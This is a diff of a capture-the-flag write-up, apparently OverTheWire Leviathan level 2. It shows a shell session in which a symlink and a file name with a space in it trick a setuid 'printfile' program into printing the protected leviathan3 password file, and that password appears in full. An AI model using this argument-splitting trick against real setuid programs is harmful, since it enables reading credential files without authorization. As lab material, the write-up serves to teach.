@@ -24,10 +24,7 @@ leviathan2@leviathan:/tmp/dusu$ ~/printfile "test 2".txt
 /bin/cat: 2.txt: No such file or directory
 leviathan2@leviathan:/tmp/dusu$ # cat tries to read from 2 different files.
 leviathan2@leviathan:/tmp/dusu$ # soooooo ...
-leviathan2@leviathan:/tmp/dusu$ rm test.txt 
-leviathan2@leviathan:/tmp/dusu$ ln -s /etc/l
-ldap/           ld.so.conf      leviathan_pass/ lighttpd/       locale.gen      logcheck/       logrotate.conf  ltrace.conf     
-ld.so.cache     ld.so.conf.d/   libaudit.conf   locale.alias    localtime       login.defs      logrotate.d/    lvm/            
+leviathan2@leviathan:/tmp/dusu$ rm test.txt      
 leviathan2@leviathan:/tmp/dusu$ ln -s /etc/leviathan_pass/leviathan3 test
 leviathan2@leviathan:/tmp/dusu$ ~/printfile "test 2".txt
 Ahdiemoo1j
@@ -35,4 +32,6 @@ Ahdiemoo1j
 
 ---------------------------------------
 The password for leviathan3 is Ahdiemoo1j
+
+
 
